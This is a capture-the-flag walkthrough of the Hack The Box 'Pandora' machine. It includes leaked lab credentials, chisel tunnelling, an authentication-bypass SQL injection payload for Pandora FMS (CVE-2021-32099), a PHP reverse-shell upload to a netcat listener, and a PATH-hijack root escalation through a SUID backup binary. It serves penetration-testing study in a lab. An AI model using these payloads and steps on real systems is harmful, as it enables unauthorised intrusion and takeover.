---
description: 'Date: 02/12/22'
---

# Pandora (Easy)

HTB Pandora (Easy)

10.10.11.136

Mississippi pandora Daniel

nmap -sU -sC -sV -p 161 -v 10.10.11.136 -T5

* Clear-text credentials: daniel | HotelBabylon23

Check for the processes running on the machine... Is there anything interesting running on the local private ports?

* "ps aux" -- gave me nothing.
* "netstat -tulpn | grep LISTEN" -- I see 127.0.0.1:3306, 127.0.0.53:53, :::80, :::22, and 0.0.0.0:22.
  * This confirms that there are services running locally on this machine that we cannot access via our Kali machine.
  * Port forwarding???
  * Let's curl these ports with our current SSH session and see if we get any interesting replies.
    * I kept getting curl: (1) Received HTTP/0.9 when not allowed with the majority of the ports.
    * However, when I curled 127.0.0.1:80, I found the following:
      * \<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora\_console/">
      * We need to chisel to this service as it seems interesting.

Let's try something else real quick:

* curl 127.0.0.1:80/pandora\_console
* We get: \<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> \<html>\<head> \<title>301 Moved Permanently\</title> \</head>\<body> \<h1>Moved Permanently\</h1> \<p>The document has moved \<a href="[http://127.0.0.1/pandora\_console/](http://127.0.0.1/pandora\_console/)">here\</a>.\</p> \<hr> \<address>Apache/2.4.41 (Ubuntu) Server at 127.0.0.1 Port 80\</address> \</body>\</html>

Now, let's try to curl 127.0.0.1:80/pandora\_console/ since the "document has moved to that new directory.

* curl 127.0.0.1:80/pandora\_console/
* We get source code to a website -- Pandora\_Console.

So, how do we access this service from our attacker machine?

* We port forward using chisel.
* first, we must get the chisel binary to the target server.
* "cd /usr/bin"
* Now that we are in the "binaries" directory, we will be compressing the binary "chisel" in order to prepare it to be transferred to the target machine.
* "upx -k chisel"
* Now that we have compressed the chisel binary, let's spin up an HTTP server so we can initiate the file transfer.
* "python3 -m http.server"
* While logged into SSH as Daniel on the target machine, we must navigate to the temp directory to transfer the file because we can write here.
* "cd /tmp"
* Now that we are in the temp directory, lets wget our tun0 address followed by port 8000 and the file we want to grab:
* "wget[http://10.10.14.11:8000/chisel](http://10.10.14.11:8000/chisel)"
* You now have the chisel binary directly on the Pandora target server.
* The INSANE thing about the upx tool is that we can directly use the binary immediately as if we would on the attacking computer.
* "chmod +x chisel"
* Simply run a ./chisel to verify success.
* Go back to your attacking machine and execute the following to spin up a chisel server.
* "chisel server -p 9002 --reverse -v"
* Now that our chisel server is up and running, let's start the chisel client on the target computer using our SSH connection:
* "./chisel client 10.10.14.11:9002 R:9005:127.0.0.1:80"
* You should now see "Connecting... Connected."
* Let's verify that we now have access to the internal webserver:
* Open up your browser on your attacker machine and navigate to: 127.0.0.1:9005
* You now have access to pandora\_console/
* I tried to login using Daniel's credentials and got the error:
  * "Error -- User only can use the API."
* Do we look for an API now so we can use our Daniel credentials to access it??

WAPALYZER REPORT:

* PHP Programming Language
* jQuery 3.3.1
* jQuery UI 1.12.1
* Underscore.js 1.8.3
* File upload vulnerability via PHP (Arbitrary File Upload)??
  * [https://www.exploit-db.com/exploits/45790](https://www.exploit-db.com/exploits/45790)
* Client-Side Object-Pollution? -[https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md)
* I spent a lot of time on this box at this point. -- I decided to go back to the basics.
  * Why don't we just look up Pandora FMS vulnerabilities?
  * I did and found the following site:
    * [https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained\\\\\\\\](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained////)
    * We then see the following vulnerabilities are associated with this version of pandora-fms.
      * SQL Injection (pre authentication) (CVE-2021-32099)
      * Phar deserialization (pre authentication) (CVE-2021-32098)
      * Remote File Inclusion (lowest privileged user) (CVE-2021-32100)
      * Cross-Site Request Forgery (CSRF)
* I found a proof of concept (PoC) for CVE-2021-32099:
  * [https://github.com/zjicmDarkWing/CVE-2021-32099](https://github.com/zjicmDarkWing/CVE-2021-32099)
  * PoC:
    * http: [//127.0.0.1:9005/pandora\_console/include/chart\_generator.php?session\_id=' union SELECT 1,2,'id\_usuario|s:5:"admin";' as data -- SgGO](notion://127.0.0.1/pandora\_console/include/chart\_generator.php?session\_id=%27%20union%20SELECT%201,2,%27id\_usuario%7Cs:5:%22admin%22;%27%20as%20data%20--%20SgGO)
    * Put this in the URL bar and press enter.
    * You will see a blank screen. Press the back arrow now.
    * BOOM! You have access to the pandora-fms admin portal.
* We need to find a way to upload a php reverse-shell now.
  * After some digging around, I found a youtube video on the sonarsource site.
  * It depicts an attacker navigating to the "Admin Tools" option on the sidebar of the admin page.
  * Admin Tools >> Extension Manager >> Extension Uploader.
    * We now see a file upload page.
    * Shall we try a PHP reverse shell?
      * Yes, use the pentest monkey php-reverse-shell on Github and change the IP address to your tun0 address on your attacking machine as well as the port in the script.
      * [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
      * You must save it as a zip file. In this case, "zip ezshell.php.zip ezshell.php"
      * Make the file and set up a netcat listener:
        * "sudo nc -lnvp 6969"
        * Go to the extension uploader and upload the zip file.
        * Now navigate to http: [//127.0.0.1:9005/pandora\_console/extensions/ezshell.php](notion://127.0.0.1/pandora\_console/extensions/ezshell.php)
        * If that does not work, just go to http: [//127.0.0.1:9005/pandora\_console/extensions](notion://127.0.0.1/pandora\_console/extensions) and click on ezshell.php while the netcat listener is running and you will be presented with a shell in your listener!
* We have shell, now what?
  * Upgrade your dummy shell.
    * python3 -c 'import pty;pty.spawn("/bin/bash")'
    * Now, you see that you are the user "Matt".
    * Navigate to Matt's home directory and grab the user flag: "cat user.txt"
* Privilege Escalation Time -- Let's get that ROOOOOOOT BABY!!!
  * I ended up getting [linpeas.sh](http://linpeas.sh/) on the target via HTTP server.
  * Let's try a Linux Process Snooping tool called pspy:
  * http:// [github.com/DominicBreuker/pspy](http://github.com/DominicBreuker/pspy)
  * I found MariaDB Credentials
  * "mysql -u pandora -p pandora" Password: PandoraFMSSecurePass2021
  * Now you get access to MariaDB
  * Unfortunately, to my knowledge, this is a rabbit hole and just wasted my time.
  * We see in linpeas that there is an unknown SUID named pandora\_backup. This file is in /usr/bin.
  * Let's try to run it: "./pandora\_backup"
  * It will fail. Let's cat it and see what's in it.
  * We need to upgrade our shell to a more stable shell. Maybe even something more secure?
  * To do this, we generate an SSH key on our attack box.
    * Go into your home directory and do "ssh-keygen"
    * Cat your id\_rsa.pub and copy it.
    * Nano a file called authorized\_keys and paste your id\_rsa.pub key in here.
    * Now go into your .ssh file and begin a http.server: "
      * python3 -m http.server"
      * Now get back to the target machine.
      * Navigate to Matt's home directory.
      * Generate an SSH key with "ssh-keygen"
      * Cd into the .ssh directory in Matt's home directory.
      * "wget http: //ipaddress:8000/authorized\_keys"
      * Change permissions on the authorized\_keys file or this will not work. It must be 600.
        * "chmod 600 authorized\_keys"
      * Go back to your attack box and SSH into the machine as Matt:
        * "ssh -i /home/kali/.ssh/id\_rsa [matt@10.10.11.136](mailto:matt@10.10.11.136)"
        * You should now have access via SSH as Matt.
* If you look at the Linpeas output, you will notice that there is an unknown SUID file known as "pandora\_backup".
* I catted the file and saw the following:
  * "system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora\_console/\*);"
  * Usually, when a binary is called in system(), it is specifying its full path.
  * When you run a "sudo -l" on your own machine, you will see that a "secure\_path" variable is established.
    * As long as the secure\_path is defined, the system won't run any binary outside of the secure\_path without root privileges.
    * When we tried to "sudo -l" on the box without an SSH session, we saw that a policy could not be established -hence secure\_path.
    * So, if we were to make a custom binary (we'll name it "tar" for example) and add it to path, what is stopping the system from running it?
      * Usually, secure\_path will handle it and it won't be executed unless there are root privileges. But in this case, there is no defined secure\_path.
* \*\*\* - Steps to root: \*\*\*\*

1. "ssh -i /root/kali/.ssh/id\_rsa [matt@10.10.11.136](mailto:matt@10.10.11.136)"
2. cd /tmp
3. export PATH="/tmp:$PATH"
4. printf '#!/bin/bash\n/bin/sh -i #\n' > tar
5. chmod +x tar
6. pandora\_backup
   * This will attempt to execute the script but will execute "tar" instead because secure\_path is not set and we established /tmp to be our path. Now /bin/bash was executed within tar, and we have a root shell.
